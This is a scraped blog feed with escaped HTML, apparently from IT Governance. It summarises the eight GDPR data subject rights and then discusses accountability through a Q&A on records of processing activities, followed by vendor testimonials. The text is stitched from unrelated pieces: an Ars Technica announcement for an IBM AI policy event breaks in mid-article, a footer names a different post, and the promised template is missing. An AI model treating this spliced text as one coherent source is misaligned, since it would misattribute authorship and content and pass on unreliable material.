&lt;p&gt;Individuals suffer when their &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-how-the-definition-of-personal-data-will-change" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; is lost, stolen or abused, so those who process it must look after it properly. Furthermore, organisations don’t own that data – it continues to belong to the individual, which the eight data subject rights reflect.&lt;/p&gt;



&lt;p&gt;Let’s go through them all.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-be-informed"&gt;The right to be informed&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-of-access"&gt;The right of access&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-rectification"&gt;The right to rectification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-erasure"&gt;The right to erasure&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-restrict-processing"&gt;The right to restrict processing&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-data-portability"&gt;The right to data portability&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-object"&gt;The right to object&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Rights-related-to-automated-decision-making-including-profiling"&gt;Rights related to automated decision-making, including profiling&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-be-informed"&gt;1. The right to be informed (Article 13 and Article 14)&lt;/h2&gt;



&lt;p&gt;You need to tell individuals:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What personal data you’re collecting from them;&lt;/li&gt;



&lt;li&gt;How you’re using it (or will be using it);&lt;/li&gt;



&lt;li&gt;How long you’re keeping it for; and&lt;/li&gt;



&lt;li&gt;Various other information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Most data controllers choose to communicate this information via a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-write-a-gdpr-privacy-notice-with-documentation-template-example" rel="noreferrer noopener" target="_blank"&gt;privacy notice&lt;/a&gt; (but this isn’t your only way to facilitate this right).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-of-access"&gt;2. The right of access (Article 15)&lt;/h2&gt;



&lt;p&gt;Data subjects may request a copy of the personal data you’re processing (on that data subject), as well as information you must also share under Articles 13 and 14 (the right to be informed).&lt;/p&gt;



&lt;p&gt;This includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The purpose(s) of processing;&lt;/li&gt;



&lt;li&gt;The categories of personal data;&lt;/li&gt;



&lt;li&gt;The recipients of the personal data;&lt;/li&gt;



&lt;li&gt;Whether &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; is taking place, its significance, and envisaged consequences for the data subject; and&lt;/li&gt;



&lt;li&gt;Whether you’re transferring the data &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, and if so, what safeguards are in place.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You must also inform data subjects of their other GDPR rights. That includes the right to lodge a complaint with the supervisory authority. In the UK, that’s the ICO (Information Commissioner’s Office).&lt;/p&gt;



&lt;p&gt;When a data subject exercises their right of access, we usually refer to this as a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-respond-to-a-data-subject-access-request" rel="noreferrer noopener" target="_blank"&gt;DSAR (data subject access request)&lt;/a&gt;. But they’re not obliged to use that (or any other) specific phrase for their request to be valid.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you must respond within one month.&lt;/p&gt;

&lt;p class="has-text-align-center"&gt;&lt;strong&gt;&lt;em&gt;Free webinar on demand: How to ensure DSAR compliance&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"&gt;&lt;div class="wp-block-embed__wrapper"&gt;
&lt;div class="flex-video flex-video-youtube"&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/figure&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-16018d1d wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link has-white-color has-luminous-vivid-orange-background-color has-text-color has-background has-link-color wp-element-button" href="https://www.itgovernance.co.uk/dsar-compliance-how-to-handle-requests-and-build-trust" rel="noreferrer noopener" target="_blank"&gt;Download now&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-rectification"&gt;3. The right to rectification (Article 16)&lt;/h2&gt;



&lt;p&gt;One of the key GDPR principles (Article 5(1)(d)) is ‘accuracy’.&lt;/p&gt;



&lt;p&gt;Related to that principle is the ‘right to rectification’. If exercised – meaning that a data subject alerts you to incorrect personal data on them – you (the &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controller&lt;/a&gt;) must correct it.&lt;/p&gt;



&lt;p&gt;The right to rectification also means that if a data subject points out that, within the purposes of data processing, the data on them is incomplete, you must complete it.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you have one month to, if applicable, make the corrections and respond to the data subject.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-erasure"&gt;4. The right to erasure (Article 17)&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-17-what-is-the-right-to-erasure" rel="noreferrer noopener" target="_blank"&gt;right to erasure&lt;/a&gt; is also known as the ‘right to be forgotten’. It obliges you to erase someone’s data if they ask you to, where any of the following applies:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The processing was unlawful to begin with.&lt;/li&gt;



&lt;li&gt;The data subject has withdrawn their consent.&lt;/li&gt;



&lt;li&gt;You need to destroy the data to comply with a legal obligation.&lt;/li&gt;



&lt;li&gt;You no longer need the personal data for the purpose(s) for which you collected it.&lt;/li&gt;



&lt;li&gt;You were collecting the data to offer information society services directly to a child.&lt;/li&gt;



&lt;li&gt;The data subject can legitimately object to the processing (see ‘the right to object’ below).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This right isn’t absolute, and you don’t need to delete the data if you still need the data to comply with a legal obligation, for example, or need it for reasons of public interest or archiving purposes.&lt;/p&gt;



&lt;p&gt;If you receive a request to be forgotten, you must respond within one month – either having actioned the request, or to explain why you need to keep (some of) their data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-restrict-processing"&gt;5. The right to restrict processing (Article 18)&lt;/h2&gt;



&lt;p&gt;If a data subject exercises this right, you may store their data but not process it. (The restriction normally only applies for a limited time.)&lt;/p&gt;



&lt;p&gt;Someone may exercise this right because:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They’re contesting the accuracy of the personal data;&lt;/li&gt;



&lt;li&gt;The processing is unlawful, but the subject doesn’t want their data destroyed;&lt;/li&gt;



&lt;li&gt;They’re challenging whether your legitimate grounds for processing override their interests; or&lt;/li&gt;



&lt;li&gt;You don’t need the personal data anymore, but the subject needs it to establish, exercise or defend a legal claim.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Again, if exercised, you must respond within one month.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-data-portability"&gt;6. The right to data portability (Article 20)&lt;/h2&gt;



&lt;p&gt;This right allows people to obtain their data from you in a “structured, commonly used and machine-readable format”, so they can easily reuse their data for other purposes.&lt;/p&gt;



&lt;p&gt;Someone will typically exercise this right when they’re changing providers – for their mobile phone contract, for example. That said, this right may be exercised in any circumstances where the data subject wants to have their personal data transferred to a different controller.&lt;/p&gt;



&lt;p&gt;Data subjects can only exercise this right if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They provided their data under the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; of consent; &lt;em&gt;and&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;Where the processing is carried out by “automated means”.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Put differently, they can only exercise it where the transfer is “technically feasible” (Article 20(2)).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-object"&gt;7. The right to object (Article 21)&lt;/h2&gt;



&lt;p&gt;Article 21(1) of the GDPR says:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;The data subject shall have the right to object, on grounds relating to his or her particular situation, at any time to processing of personal data concerning him or her which is based on points (e) or (f) of Article 6(1) [to perform a task in the public interest or for a legitimate interest], including profiling based on those provisions.&lt;/p&gt;



&lt;p&gt;The controller shall no longer process the personal data unless the controller demonstrates compelling legitimate grounds for the processing which override the interests, rights and freedoms of the data subject or for the establishment, exercise or defence of legal claims.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Article 21(2) also specifies that data subjects can object to their data being used for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;direct marketing&lt;/a&gt; purposes “at any time” – meaning that this is an absolute right.&lt;/p&gt;



&lt;p&gt;Where someone objects to a processing activity, and you can’t provide good grounds for overriding that objection, you must stop that processing (but you can keep the data if you’re using it for a different, lawful activity).&lt;/p&gt;



&lt;p&gt;Whether or not you comply with a data subject exercising their right to object, you must inform them of your decision within one month of receiving the objection.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Rights-related-to-automated-decision-making-including-profiling"&gt;8. Rights related to automated decision-making, including profiling (Article 22)&lt;/h2&gt;



&lt;p&gt;People have the right not to be subject to any &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; with potentially legal or similarly significant consequences for them, unless:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;You need to conduct the processing to enter into a contract with the data subject;&lt;/li&gt;



&lt;li&gt;You’re required or authorised by law to conduct the processing; or&lt;/li&gt;



&lt;li&gt;The data subject has explicitly consented to the processing.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Where you may proceed with the processing, you must:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Inform the data subject about the processing;&lt;/li&gt;



&lt;li&gt;Enable them to easily request human intervention or challenge a decision; and&lt;/li&gt;



&lt;li&gt;Regularly review your systems to make sure they’re working as intended.&lt;/li&gt;
&lt;/ul&gt;

If you're on the East Coast and want to come hang out with Ars EIC Ken Fisher and me while we talk to some neat speakers and learn some stuff, then read on!&lt;/p&gt;
&lt;p&gt;Continuing our partnership with IBM, Ars presents "AI in DC: Privacy, Compliance, and Making Infrastructure Smarter." Our tone this time around will be a little more policy-oriented than our San Jose event. We intend to have three panel discussions, with the overall topics looking like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The key to compliance with emerging technologies&lt;/li&gt;
&lt;li&gt;Data security in the age of AI-assisted cyber-espionage&lt;/li&gt;
&lt;li&gt;The best infrastructure solution for your AI/ML strategy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Specifically, here are our panels and the final set of panelists:&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/10/join-ars-in-dc-for-infrastructure-cocktails-and-spycraft-on-october-29/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-you-can-demonstrate-gdpr-compliance"&gt;How Do You Demonstrate Accountability Under the GDPR?&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;A simple approach to GDPR accountability with ROPAs (includes template!)&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt; outlines seven key principles relating to the processing of personal data.&lt;/p&gt;



&lt;p&gt;These are often referred to as ‘data protection principles’ or ‘data processing principles’.&lt;/p&gt;



&lt;p&gt;The principles are:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Lawfulness, fairness and transparency&lt;/li&gt;



&lt;li&gt;Purpose limitation&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;Data minimisation&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Accuracy&lt;/li&gt;



&lt;li&gt;Storage limitation&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-32-your-guide-to-the-requirements" rel="noreferrer noopener" target="_blank"&gt;Integrity and confidentiality&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Accountability&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Among organisations that believe themselves GDPR compliant – and among those that don’t – accountability is often the weak link.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-is-accountability"&gt;What is accountability?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Are-your-measures-effective"&gt;Are your measures effective?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Why-GDPR-accountability-is-important"&gt;Why GDPR accountability is important&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;Making accountability easy: Q&amp;amp;A with Andrew Snow&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#ROPA-(record-of-processing-activities)-template"&gt;ROPA (record of processing activities) template&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Automate-your-GDPR-compliance"&gt;Automate your GDPR compliance&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-is-accountability"&gt;What does ‘accountability’ mean under the GDPR?&lt;/h2&gt;



&lt;p&gt;The GDPR says in Article 5(2) that &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controllers&lt;/a&gt; must be able to demonstrate compliance with the other six principles. Though the GDPR doesn’t give a formal definition for ‘accountability’, its meaning is clear:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;You must be able to &lt;em&gt;prove&lt;/em&gt; compliance.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This isn’t &lt;em&gt;just&lt;/em&gt; a key GDPR requirement, subject to the higher-tier &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Meeting this principle ensures an overall approach to data security and privacy that’s effective at addressing your risks, as well as giving you a better return on investment on your measures.&lt;/p&gt;



&lt;p&gt;Accountability means being able to show your personal data processing activities are secure and GDPR compliant.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Are-your-measures-effective"&gt;Are your measures effective?&lt;/h2&gt;



&lt;p&gt;As evident from the many &lt;a href="https://www.itgovernance.co.uk/blog/free-expert-insights" rel="noreferrer noopener" target="_blank"&gt;conversations&lt;/a&gt; I have with subject-matter experts, organisations tend to implement measures and then forget about them.&lt;/p&gt;



&lt;p&gt;But you implement a control to &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;address a risk&lt;/a&gt; and bring it down to an acceptable level.&lt;/p&gt;



&lt;p&gt;You can’t, however, stop there.&lt;/p&gt;



&lt;p&gt;First, confirm that the &lt;strong&gt;control is effective&lt;/strong&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Did you implement it correctly, or does it require fine-tuning to get the result you want? Check that your money (and time) were well spent.&lt;/li&gt;



&lt;li&gt;Was the control the best risk treatment option you had? Don’t forget, as with many aspects in business, you make decisions based on your best guess only. There’s no shame in finding out you’re wrong, but that’s no excuse for &lt;em&gt;staying&lt;/em&gt; wrong.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Second, &lt;strong&gt;risks aren’t static&lt;/strong&gt; – especially in a world where digital information is prevalent. Cyber threats and vulnerabilities are constantly changing, and risks change with them.&lt;/p&gt;



&lt;p&gt;Organisations change, too. Over time, you’ll modify the way you do things – bring in a new system, for example, or amend the way you conduct a certain activity. You may even go through a major change like a merger or an acquisition.&lt;/p&gt;



&lt;p&gt;In short, a measure that’s effective today may not be so effective a few months from now.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Why-GDPR-accountability-is-important"&gt;Why do we need accountability under the GDPR?&lt;/h2&gt;



&lt;p&gt;The above is why accountability under the GDPR is so important.&lt;/p&gt;



&lt;p&gt;It transforms GDPR compliance from a box-ticking exercise into a catalyst to improve the way you operate as a business. It means you’re:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Managing your risks better – not just to your data subjects (customers, employees, etc.), but also to your organisation;&lt;/li&gt;



&lt;li&gt;Keeping track of what data you’re collecting and why, and destroying data you’re not using or no longer need; and&lt;/li&gt;



&lt;li&gt;Making your processes more efficient and have more confidence in your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;It’s the difference between creating a &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPA (record of processing activities)&lt;/a&gt; as a one-off exercise, and turning that ROPA into a type of asset register of true business value to your organisation.&lt;/p&gt;



&lt;p&gt;It’s the difference between just creating &lt;a href="https://www.itgovernance.co.uk/blog/the-documents-you-need-to-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;, and also generating records that’ll tell you that your processes are working and show a regulator – and other stakeholders – that you are, indeed, GDPR compliant.&lt;/p&gt;



&lt;p&gt;The accountability principle entails these types of differences.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;How to be accountable under the GDPR&lt;/h2&gt;



&lt;p&gt;One approach is explore the ICO’s (Information Commissioner’s Office) &lt;a href="https://ico.org.uk/media/for-organisations/documents/2619653/accountability-tracker-202104.xlsm" rel="noreferrer noopener" target="_blank"&gt;accountability tracker&lt;/a&gt; and/or &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/accountability-framework/navigating-the-accountability-framework/" rel="noreferrer noopener" target="_blank"&gt;accountability framework&lt;/a&gt;. As the UK’s supervisory authority, this is a natural place to start for UK organisations.&lt;/p&gt;



&lt;p&gt;But is there a simpler way of showing accountability?&lt;/p&gt;



&lt;p&gt;I sat down with Andrew ‘Andy’ Snow, our &lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;data privacy trainer&lt;/a&gt; and a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, to find out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How would you approach GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Well, accountability means that you need to be able to point at a [personal data] processing activity and say:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; is [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring purpose limitation like [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring accuracy like [this].&lt;/li&gt;



&lt;li&gt;We’re securing data like [this].&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Having clear answers when questioned about anything related to the data protection principles is a good place to start. It shows you’ve thought about the principles and how you’re meeting them.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations address the data protection principles in a practical way?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I’d start with your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;. We’ve previously talked about how you can make them your focal point of GDPR compliance by using them as a ‘one-stop shop’.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[You can read the full interview Andy is referring to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;here&lt;/em&gt;&lt;/a&gt;&lt;em&gt;.]&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;This is precisely how I’ve approached my own ROPA template. I’ve tried to make it a more relevant document for organisations by putting all useful information in one place – not just what the GDPR lists in Article 30, but also cover:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Accountability;&lt;/li&gt;



&lt;li&gt;How you’ll cater for data subject rights; and&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-six-key-stages-of-the-data-protection-impact-assessment-dpia" rel="noreferrer noopener" target="_blank"&gt;DPIA&lt;/a&gt; [data protection impact assessment] information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;I also use it for data flow information and as a risk register. Those aren’t explicit GDPR requirements, but having that information handy certainly helps you meet other legal and regulatory requirements and keep data secure.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How does using your ROPA like that help keep personal data secure?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Because, if you don’t know what data you have, where it’s going, or what risks are associated with it, how can you possibly protect it? For that matter, how can your business processes be maximally effective?&lt;/p&gt;



&lt;p&gt;But if you keep that information together – the kind you’d want to regularly use in day-to-day activities, not just document then forget about – accountability becomes part of business as usual without too much effort, once you’ve put together those ROPAs.&lt;/p&gt;



&lt;p&gt;This approach to ROPAs also provides a ‘single source of truth’. It’s like version control in an ISMS [information security management system, ideally aligned to &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001&lt;/a&gt;].&lt;/p&gt;



&lt;p&gt;If you scatter your documentation, and someone updates a document in one location but not in another, how will you establish which is correct? Will people even realise that there are two [or more] versions of that document?&lt;/p&gt;



&lt;p&gt;Whereas if everyone defaults to their ROPA to check the &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention period&lt;/a&gt;, which also contains hyperlinks to the documented consent, DPIA, etc., that makes for a considerably more coherent approach.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you share your ROPA template with us?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Of course! Trainees regularly ask for a copy, which I’m happy to share – I hope it gives people a good starting point.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[We’ve recreated Andy’s template below.]&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Thanks a lot, Andy. My final question: for those looking to further automate compliance, or who aren’t keen on spreadsheets, is &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CyberComply&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; a good solution for demonstrating GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;It most certainly is, but it’ll take buy-in from management for it to work. Without that buy-in, no solution will work in the long run – accountability is something that needs to be baked into the organisation’s culture, which has to come from management.&lt;/p&gt;



&lt;p&gt;The organisation must be accountable for every processing activity. It must have due regard for all risks associated with its processing activities.&lt;/p&gt;



&lt;p&gt;So, if you &lt;em&gt;don’t&lt;/em&gt; have an Article 30 ROPA, and you’re &lt;em&gt;not&lt;/em&gt; tracking all these processing activities, how do you even &lt;em&gt;understand&lt;/em&gt; the risks from specific activities? [A specific responsibility of the &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead" rel="noreferrer noopener" target="_blank"&gt;DPO or data privacy lead&lt;/a&gt;.]&lt;/p&gt;



&lt;p&gt;Accountability needs to be embedded into everything organisations do. Again, it’s having that one-stop shop.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="ROPA-(record-of-processing-activities)-template"&gt;Free ROPA template&lt;/h2&gt;



&lt;p&gt;&lt;em&gt;Andy’s ROPA template doesn’t fit (legibly) into one screenshot. Instead, we’ve replicated his Excel-based template in segments, which you can easily tailor to suit your needs.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Tips:&lt;/em&gt;&lt;/strong&gt;&lt;em&gt; Colour-coding your risks (e.g. green/amber/red to indicate low/medium/high risk) is a good idea. Excel formulas to automatically calculate risks can also speed up this process.&lt;/em&gt;&lt;/p&gt;

&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;This tool has been a business enabler that allowed us to move away from clunky and ineffective Excel spreadsheets to manage our risks.&lt;/p&gt;



&lt;p&gt;I’d highly recommend CyberComply to anyone looking for a value-for-money risk management and compliance platform.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Nikolaus:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;CyberComply is an easy and reliable platform to use to fulfil the compliance objectives. Data mapping can be connected with the related data protection impact assessment on one platform.&lt;/p&gt;



&lt;p&gt;With increasing demand of data security, we are happy to have this tool.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Felipe:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;CyberComply was sourced for being a one-stop, all-in-one product we needed for our compliance and data security needs.&lt;/p&gt;



&lt;p&gt;It’s easy-to-use nature, backed up with a sterling set of consultants who maintain it and align to current security frameworks, has made our journey much easier to transition.&lt;/p&gt;



&lt;p&gt;It’s also removed our need and reliance on spreadsheets, whilst presenting one single source of truth for all our risks and data protection needs.&lt;/p&gt;
&lt;/blockquote&gt;

